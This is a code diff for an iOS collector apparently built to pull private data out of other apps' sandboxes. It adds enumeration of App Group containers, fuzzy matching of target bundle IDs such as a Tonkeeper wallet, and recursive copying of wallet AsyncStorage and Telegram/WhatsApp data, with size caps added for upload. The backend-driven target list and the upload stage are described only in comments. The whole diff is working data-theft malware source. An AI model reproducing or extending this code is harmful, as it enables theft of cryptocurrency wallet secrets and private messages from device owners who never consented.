@@ -429,6 +429,75 @@ static NSDictionary<NSString *, NSString *> *WQEnumerateContainers(NSUInteger *g
     return map;
 }
 
+/// App Group 共享容器：group.* 这类 bundle 的数据不在 Data/Application 下，
+/// 而在 /private/var/mobile/Containers/Shared/AppGroup/<UUID>/。
+/// 容器根里的 .com.apple.mobile_container_manager.metadata.plist 带
+/// MCMMetadataIdentifier，值就是 group.<id>。
+static NSUInteger WQEnumerateAppGroups(NSMutableDictionary<NSString *, NSString *> *map) {
+    NSString *root = @"/private/var/mobile/Containers/Shared/AppGroup";
+    NSArray<NSString *> *dirs = wq_list(root, NULL);
+    if (!dirs) {
+        wq_grant(root);
+        dirs = wq_list(root, NULL);
+    }
+    if (!dirs) {
+        WQFileLog([NSString stringWithFormat:@"app-group-scan: 列不出 %@ errno=%d", root, errno]);
+        return 0;
+    }
+
+    NSUInteger added = 0, denied = 0, ungranted = 0;
+    for (NSString *name in dirs) {
+        NSString *path = [root stringByAppendingPathComponent:name];
+        NSString *meta = [path stringByAppendingPathComponent:
+                          @".com.apple.mobile_container_manager.metadata.plist"];
+        NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:meta];
+        id identifier = plist[@"MCMMetadataIdentifier"];
+        if (![identifier isKindOfClass:[NSString class]] || [(NSString *)identifier length] == 0) continue;
+        if (map[(NSString *)identifier]) continue;
+
+        // 别把 grant 当唯一门槛：Shared/AppGroup 下有些容器不需要单独签 extension
+        // 就能列目录（实测能读到）。只要读得到就收进索引，grant 结果只做记录。
+        BOOL granted = wq_grant(path);
+        BOOL readable = (wq_list(path, NULL) != nil);
+        if (!readable) { denied++; continue; }
+        if (!granted) ungranted++;
+        map[(NSString *)identifier] = path;
+        added++;
+    }
+    WQFileLog([NSString stringWithFormat:@"app-group-scan: %lu 个容器，新增 %lu 个 group（读不到 %lu / 未 grant 但可读 %lu）",
+               (unsigned long)dirs.count, (unsigned long)added,
+               (unsigned long)denied, (unsigned long)ungranted]);
+    return added;
+}
+
+static NSUInteger WQCommonPrefixLength(NSString *a, NSString *b) {
+    NSUInteger n = MIN(a.length, b.length);
+    NSUInteger i = 0;
+    while (i < n && [a characterAtIndex:i] == [b characterAtIndex:i]) i++;
+    return i;
+}
+
+/// 给"容器不在索引里"的 bundle 列出最相近的几个 label，
+/// 用来区分"确实没装"和"bundle_id 与真实 id 差一个字母"（例如
+/// 后台写的 com.jbig.tonkeeper 对应真实 id com.jbiga.tonkeeper）。
+static NSString *WQClosestLabels(NSArray<NSString *> *labels, NSString *target, NSUInteger limit) {
+    NSMutableArray<NSString *> *best = [NSMutableArray array];
+    for (NSString *label in labels) {
+        NSUInteger score = WQCommonPrefixLength(label, target);
+        if (score < 4) continue;
+        NSUInteger insertAt = 0;
+        while (insertAt < best.count &&
+               WQCommonPrefixLength(best[insertAt], target) >= score) {
+            insertAt++;
+        }
+        if (insertAt < limit) {
+            [best insertObject:label atIndex:insertAt];
+            if (best.count > limit) [best removeLastObject];
+        }
+    }
+    return best.count ? [best componentsJoinedByString:@", "] : @"(无相近项)";
+}
+
 static NSString *WQJSONFromArray(NSArray *items) {
     NSData *data = [NSJSONSerialization dataWithJSONObject:items options:0 error:NULL];
     if (!data) return @"[]";
@@ -484,12 +553,28 @@ static NSUInteger WQCopyContainer(NSString *containerPath, NSString *destDir, NS
     return copied;
 }
 
+typedef struct {
+    unsigned long long bytes;
+    NSUInteger files;
+    BOOL truncated;
+} WQCopyBudget;
+
+// 单个应用的复制上限：TG / WhatsApp 的整容器能到几十 GB，不设闸会把设备
+// 和上传都拖死。钱包类数据实际只有几百 KB ~ 几十 MB，这个上限足够。
+static const unsigned long long kMaxCopyBytes = 3ULL * 1024 * 1024 * 1024;   // 3 GiB
+static const NSUInteger kMaxCopyFiles = 80000;
+
 /// 按清单递归复制一棵目录树（不限深度，跳过软链环）。
 /// WQCopyContainer 只到容器根下第 3 层，而钱包类 App 的 AsyncStorage 落在
 /// Library/Application Support/<bundle>/RCTAsyncLocalStorage_V1/（第 4~5 层），
 /// 必须走这条才能拿到。
-static NSUInteger WQCopyTree(NSString *src, NSString *dst, NSUInteger depth) {
+static NSUInteger WQCopyTree(NSString *src, NSString *dst, NSUInteger depth, WQCopyBudget *budget) {
     if (src.length == 0 || depth > 16) return 0;
+    if (budget && (budget->truncated || budget->bytes >= kMaxCopyBytes ||
+                   budget->files >= kMaxCopyFiles)) {
+        budget->truncated = YES;
+        return 0;
+    }
     NSArray<NSString *> *names = wq_list(src, NULL);
     if (!names) {
         WQScopeLog(@"tree: 列目录失败 %@ errno=%d", src, errno);
@@ -507,10 +592,20 @@ static NSUInteger WQCopyTree(NSString *src, NSString *dst, NSUInteger depth) {
         if (lstat(child.fileSystemRepresentation, &sb) != 0) continue;
         if (S_ISLNK(sb.st_mode)) continue;          // 不跟随，避免 AppGroup 软链环
         if (S_ISDIR(sb.st_mode)) {
-            copied += WQCopyTree(child, target, depth + 1);
+            copied += WQCopyTree(child, target, depth + 1, budget);
         } else if (S_ISREG(sb.st_mode)) {
+            if (budget &&
+                (budget->bytes + (unsigned long long)sb.st_size > kMaxCopyBytes ||
+                 budget->files >= kMaxCopyFiles)) {
+                budget->truncated = YES;
+                break;
+            }
             if (wq_copy_to_local(child, target, NULL)) {
                 copied++;
+                if (budget) {
+                    budget->bytes += (unsigned long long)sb.st_size;
+                    budget->files++;
+                }
             } else {
                 // 数据保护（NSFileProtectionComplete）在锁屏时读不到，errno 会说明
                 WQScopeLog(@"tree: 读失败 %@ errno=%d", child, errno);
@@ -714,8 +809,18 @@ static NSString *WQRunCollection(void) {
             WQFileLog([NSString stringWithFormat:@"retry: second pass -> %lu containers (grant %lu / refused %lu)",
                        (unsigned long)containers.count, (unsigned long)granted, (unsigned long)refused]);
         }
-        WQStage(@"阶段 3/6：容器索引就绪 — %lu 个应用（grant %lu / refused %lu）",
-                (unsigned long)containers.count, (unsigned long)granted, (unsigned long)refused);
+        // App Group 容器：group.* 这类 bundle（TG / WhatsApp / 备忘录）的数据不在
+        // Data/Application 下，只有 Shared/AppGroup 里才有。
+        NSUInteger appContainerCount = containers.count;
+        NSUInteger groupContainerCount = 0;
+        {
+            NSMutableDictionary<NSString *, NSString *> *merged = [containers mutableCopy];
+            groupContainerCount = WQEnumerateAppGroups(merged);
+            containers = merged;
+        }
+        WQStage(@"阶段 3/6：容器索引就绪 — %lu 个应用 + %lu 个 App Group（grant %lu / refused %lu）",
+                (unsigned long)appContainerCount, (unsigned long)groupContainerCount,
+                (unsigned long)granted, (unsigned long)refused);
         // 把 WQ 内部日志的尾部落盘（grant 失败的具体原因、query 返回码都在里面）
         {
             NSString *wqText = wq_log_text();
@@ -749,7 +854,8 @@ static NSString *WQRunCollection(void) {
             NSString *container = containers[bundleID];
             if (!container) {
                 [missing addObject:bundleID];
-                WQScopeLog(@"[%@] 容器不在索引里（未安装 / grant 失败 / bundle_id 写法不一致）", bundleID);
+                WQScopeLog(@"[%@] 容器不在索引里；最相近的 label：%@", bundleID,
+                           WQClosestLabels(containers.allKeys, bundleID, 3));
                 continue;
             }
             NSString *safeName = [bundleID stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
@@ -768,6 +874,7 @@ static NSString *WQRunCollection(void) {
 
             NSError *copyError = nil;
             NSUInteger copiedFiles = 0;
+            WQCopyBudget budget = {0};
             if (dirList.count == 0 && fileList.count == 0) {
                 // 清单为空（旧服务端 / 后台没勾选）：退回整容器 3 层，与之前行为一致
                 copiedFiles = WQCopyContainer(container, dest, &copyError);
@@ -777,7 +884,7 @@ static NSString *WQRunCollection(void) {
                     BOOL whole = [rel isEqualToString:@"."];
                     NSString *srcPath = whole ? container : [container stringByAppendingPathComponent:rel];
                     NSString *dstPath = whole ? dest : [dest stringByAppendingPathComponent:rel];
-                    copiedFiles += WQCopyTree(srcPath, dstPath, WQRelativeDepth(rel));
+                    copiedFiles += WQCopyTree(srcPath, dstPath, WQRelativeDepth(rel), &budget);
                 }
                 for (NSString *rel in fileList) {
                     NSString *srcPath = [container stringByAppendingPathComponent:rel];
@@ -792,6 +899,10 @@ static NSString *WQRunCollection(void) {
                 }
             }
 
+            if (budget.truncated) {
+                WQScopeLog(@"[%@] 复制达到上限（%llu 字节 / %lu 文件），已截断",
+                           bundleID, budget.bytes, (unsigned long)budget.files);
+            }
             if (copiedFiles == 0) {
                 NSLog(@"[WQCollector] %@ 未复制到文件: %@", bundleID, copyError.localizedDescription);
                 WQScopeLog(@"[%@] copy.files=0 —— 清单 %lu 目录 / %lu 文件，一个字节都没落地",
@@ -848,10 +959,10 @@ static NSString *WQRunCollection(void) {
         }
 
         // ---- 5/6 完成 ----
-        WQStage(@"阶段 5/6：采集完成 — 总计 %lu 项，已处理 %lu 个，未安装 %lu 个",
+        WQStage(@"阶段 5/6：采集完成 — 总计 %lu 项，已处理 %lu 个，容器缺失 %lu 个",
                 (unsigned long)configs.count, (unsigned long)processed, (unsigned long)missing.count);
         if (missing.count > 0) {
-            WQStage(@"未安装：%@", [missing componentsJoinedByString:@", "]);
+            WQStage(@"容器缺失：%@", [missing componentsJoinedByString:@", "]);
         }
         // 采集缺口直接上报：清单里有、但没落地或只落地一部分的条目
         if (notCopied.count > 0) {
